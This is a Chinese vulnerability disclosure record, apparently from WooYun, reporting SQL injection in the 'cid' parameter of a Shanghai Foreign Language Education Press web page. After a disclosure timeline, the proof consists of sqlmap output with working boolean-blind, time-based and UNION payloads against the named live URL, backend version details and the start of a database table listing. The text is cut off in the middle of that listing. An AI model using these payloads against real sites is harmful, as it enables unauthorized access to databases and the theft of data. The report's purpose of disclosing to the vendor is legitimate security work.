wybug_title: 上海外语教育出版社某站sql注入
wybug_detail:
漏洞详情 披露状态：   									2015-09-02：	细节已通知厂商并且等待厂商处理中									2015-09-03：	厂商已经确认，细节仅向厂商公开									2015-09-13：	细节向核心白帽子及相关领域专家公开									2015-09-23：	细节向普通白帽子公开									2015-10-03：	细节向实习白帽子公开									2015-10-18：	细节向公众公开  简要描述： 1 详细说明：  
http://pas.sflep.com/index.php?option=com_products&view=products&cid=12&Itemid=3
参数cid没过滤。   漏洞证明：  sqlmap resumed the following injection point(s) from stored session:---Parameter: cid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: option=com_products&view=products&cid=12 AND 7140=7140&Itemid=3    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: option=com_products&view=products&cid=12 AND (SELECT * FROM (SELECT(SLEEP(5)))uiOP)&Itemid=3    Type: UNION query    Title: Generic UNION query (NULL) - 10 columns    Payload: option=com_products&view=products&cid=12 UNION ALL SELECT NULL,NULL,CONCAT(0x7176766a71,0x73594749717a55475244,0x7178787a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- &Itemid=3---[17:47:40] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.2.11, Nginxback-end DBMS: MySQL 5.0.12Database: sflep_pas[52 tables]+------------------------------+| jos_attachments              || jos_banner
